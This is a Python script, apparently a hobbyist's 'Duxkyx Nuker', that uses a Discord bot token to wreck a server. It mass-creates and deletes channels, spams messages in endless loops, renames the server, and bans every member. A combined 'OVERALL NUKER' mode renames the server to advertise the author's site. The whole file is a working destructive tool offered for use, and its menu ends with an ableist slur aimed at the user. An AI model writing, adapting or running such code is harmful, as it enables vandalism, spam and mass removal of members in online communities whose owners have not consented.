from time import sleep
import discord, os, pyfiglet
from os import system

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


### this is a small project so I can understand python better, idc if u know more than me and idc if u want to complain about how messy the code is, use it or don't :)))) - Duxkyx




# this was made in like 3 hours so if u got issues dm me - Duxkyx#5079




def makechannel(token, channel_names):
    try:
        bot = discord.Client()

        @bot.event
        async def on_ready():
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Successfully connected to: {bcolors.ENDC} {bot.user}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Waiting for {bcolors.ENDC}.start{bcolors.HEADER} command... {bcolors.ENDC}')

        @bot.event
        async def on_message(ctx):
            if ctx.content == ".start":
                print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> STARTING !!! (ctrl + c to stop) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<{bcolors.HEADER}]')
                while True:
                    guild = ctx.guild
                    await guild.create_text_channel(channel_names)
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Created: {bcolors.ENDC} {channel_names}')

                    

        bot.run(token)

    except:
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC}')
        sleep(2)
        main()


def deletechannels(token):
    try:
        bot = discord.Client()

        @bot.event
        async def on_ready():
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Successfully connected to: {bcolors.ENDC} {bot.user}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Waiting for {bcolors.ENDC}.start{bcolors.HEADER} command... {bcolors.ENDC}')

        @bot.event
        async def on_message(ctx):
            if ctx.content == ".start":
                print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> STARTING !!! (ctrl + c to stop) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<{bcolors.HEADER}]')
                for i in ctx.guild.channels:
                    await i.delete()
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Deleted Channel: {bcolors.ENDC} {i.name}')


        bot.run(token)
    except:
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC}')
        sleep(2)
        main()

def renameserver(token, server_name):
    try:
        bot = discord.Client()

        @bot.event
        async def on_ready():
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Successfully connected to: {bcolors.ENDC} {bot.user}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Waiting for {bcolors.ENDC}.start{bcolors.HEADER} command... {bcolors.ENDC}')

        @bot.event
        async def on_message(ctx):
            if ctx.content == ".start":
                try:
                    await ctx.guild.edit(name=server_name)
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Server renamed to: {bcolors.ENDC} {server_name}')
                    sleep(0.5)
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Restarting in: {bcolors.ENDC} 2s')
                    sleep(2)
                    main()
                except:
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC} {server_name}')
                    sleep(2)
                    main()

        bot.run(token)

    except:
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC} {server_name}')
        sleep(2)
        main()

def sendmessageall(token, message):
    try:
        bot = discord.Client()

        @bot.event
        async def on_ready():
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Successfully connected to: {bcolors.ENDC} {bot.user}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Waiting for {bcolors.ENDC}.start{bcolors.HEADER} command... {bcolors.ENDC}')

        @bot.event
        async def on_message(ctx):
            if ctx.content == ".start":
                for i in ctx.guild.channels:
                    await i.send(message)
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Sent Message to: {bcolors.ENDC} {i.name}')
                    
        bot.run(token)

    except:
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC}')
        sleep(2)
        main()

def sendmessagetarget(token, message, id):
    try:
        bot = discord.Client()

        @bot.event
        async def on_ready():
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Successfully connected to: {bcolors.ENDC} {bot.user}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Waiting for {bcolors.ENDC}.start{bcolors.HEADER} command... {bcolors.ENDC}')

        @bot.event
        async def on_message(ctx):
            if ctx.content == ".start":
                print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> STARTING !!! (ctrl + c to stop) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<{bcolors.HEADER}]')
                channel = bot.get_channel(int(id))
                while True:
                    await channel.send(message)
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Sent Message to: {bcolors.ENDC} {channel.name}')
                    
        bot.run(token)

    except:
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC}')
        sleep(2)
        main()

def massban(token):
    try:

        intents = discord.Intents.default()
        intents.members = True
        intents=intents

        bot = discord.Client(intents=intents)

        @bot.event
        async def on_ready():
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Successfully connected to: {bcolors.ENDC} {bot.user}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Waiting for {bcolors.ENDC}.start{bcolors.HEADER} command... {bcolors.ENDC}')

        @bot.event
        async def on_message(ctx):
            if ctx.content == ".start":
                print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> STARTING !!! (ctrl + c to stop) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<{bcolors.HEADER}]')

                for member in ctx.guild.members:
                    if member != bot.user:
                        try:
                            await member.ban()
                            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Banned: {bcolors.ENDC} {member}')
                        except:
                            print(f"{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] {bcolors.FAIL}Couldn't Ban: {bcolors.ENDC} {member} (higher role/ permission level than bot)")

    
        bot.run(token)

    except:
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC}')
        sleep(2)
        main()

def overallnuke(token, message_sent, channel_namevar):
    try:
        bot = discord.Client()

        @bot.event
        async def on_ready():
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Successfully connected to: {bcolors.ENDC} {bot.user}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] FYI: {bcolors.ENDC} It is faster to use the individual commands. {bcolors.ENDC}')
            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Waiting for {bcolors.ENDC}.start{bcolors.HEADER} command... {bcolors.ENDC}')

        @bot.event
        async def on_message(ctx):
            if ctx.content == ".start":
                channel_name = channel_namevar

                print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> STARTING !!! (ctrl + c to stop) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<{bcolors.HEADER}]')
                await ctx.guild.edit(name='NUKER BY www.duxkyx.cf')
                print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Renamed Server. {bcolors.ENDC}')
                while True:

                    for i in ctx.guild.channels:
                        if i.name != channel_name:
                            await i.delete()
                            print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Channel Deleted: {bcolors.ENDC} {i.name}')

                    guild = ctx.guild
                    await guild.create_text_channel(channel_name)
                    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Created Channel: {bcolors.ENDC} {channel_name}')

                    for u in ctx.guild.channels:
                        await u.send(message_sent)
                        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Sent Message: {bcolors.ENDC} {message_sent}')




                    
        bot.run(token)

    except:
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}]{bcolors.FAIL} Error, restarting program. {bcolors.ENDC}')
        sleep(2)
        main()

def main():
    system("title " + "Duxkyx Nuker,   Made By Duxkyx#5079,   Github: github.com/duxkyx")

    clearConsole()
    print(bcolors.HEADER + pyfiglet.figlet_format('DUXKYX NUKER') + bcolors.ENDC)
    print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Made by: {bcolors.ENDC} Duxkyx {bcolors.HEADER}  [{bcolors.ENDC}>>>{bcolors.HEADER}] {bcolors.ENDC} https://duxkyx.cf {bcolors.HEADER}  [{bcolors.ENDC}>>>{bcolors.HEADER}] {bcolors.ENDC} Version 1.0 (expect bugs) \n')

    print(f'{bcolors.HEADER}[{bcolors.ENDC}1{bcolors.HEADER}]{bcolors.ENDC} Mass Create Channels {bcolors.ENDC}')
    print(f'{bcolors.HEADER}[{bcolors.ENDC}2{bcolors.HEADER}]{bcolors.ENDC} Mass Delete Channels {bcolors.ENDC}')
    print(f'{bcolors.HEADER}[{bcolors.ENDC}3{bcolors.HEADER}]{bcolors.ENDC} Re-name Server {bcolors.ENDC}')
    print(f'{bcolors.HEADER}[{bcolors.ENDC}4{bcolors.HEADER}]{bcolors.ENDC} Mass Message All Channels {bcolors.ENDC}')
    print(f'{bcolors.HEADER}[{bcolors.ENDC}5{bcolors.HEADER}]{bcolors.ENDC} Mass Message Targeted Channel {bcolors.ENDC}')
    print(f'{bcolors.HEADER}[{bcolors.ENDC}6{bcolors.HEADER}]{bcolors.ENDC} Mass Ban {bcolors.ENDC} (Must enable "Server Members Intent" on Developer Portal)')

    print(f'{bcolors.HEADER}[{bcolors.ENDC}7{bcolors.HEADER}]{bcolors.ENDC} OVERALL NUKER!!! {bcolors.ENDC} (Delete Existing Channels, Create Channels, Mass Message, Rename Server)')
    selected = input(f'\n{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Select Function: {bcolors.ENDC}')

    if selected == '1':
        first = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Bot Token: {bcolors.ENDC}')
        second = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Channel Name: {bcolors.ENDC}')
        sleep(0.3)
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Connecting... {bcolors.ENDC}')
        makechannel(first, second)

    elif selected == '2':
        first = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Bot Token: {bcolors.ENDC}')
        sleep(0.3)
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Connecting... {bcolors.ENDC}')
        deletechannels(first)

    elif selected == '3':

        first = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Bot Token: {bcolors.ENDC}')
        second = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] New Server Name: {bcolors.ENDC}')
        sleep(0.3)
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Connecting... {bcolors.ENDC}')
        renameserver(first, second)

    elif selected == '4':
        
        first = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Bot Token: {bcolors.ENDC}')
        second = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Message Sent: {bcolors.ENDC}')
        sleep(0.3)
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Connecting... {bcolors.ENDC}')
        sendmessageall(first, second)

    elif selected == '5':

        first = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Bot Token: {bcolors.ENDC}')
        second = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Message Sent: {bcolors.ENDC}')
        third = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Channel ID: {bcolors.ENDC}')
        sleep(0.3)
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Connecting... {bcolors.ENDC}')
        sendmessagetarget(first, second, third)

    elif selected == '6':

        first = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Bot Token: {bcolors.ENDC}')
        sleep(0.3)
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Connecting... {bcolors.ENDC}')
        massban(first)

    elif selected == '7':

        first = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Bot Token: {bcolors.ENDC}')
        second = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Message Sent: {bcolors.ENDC}')
        third = input(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Channel Name: {bcolors.ENDC}')
        sleep(0.3)
        print(f'{bcolors.HEADER}[{bcolors.ENDC}>>>{bcolors.HEADER}] Connecting... {bcolors.ENDC}')
        overallnuke(first, second, third)

    else:
        print(f'Select a real function retard')
        main()

main()
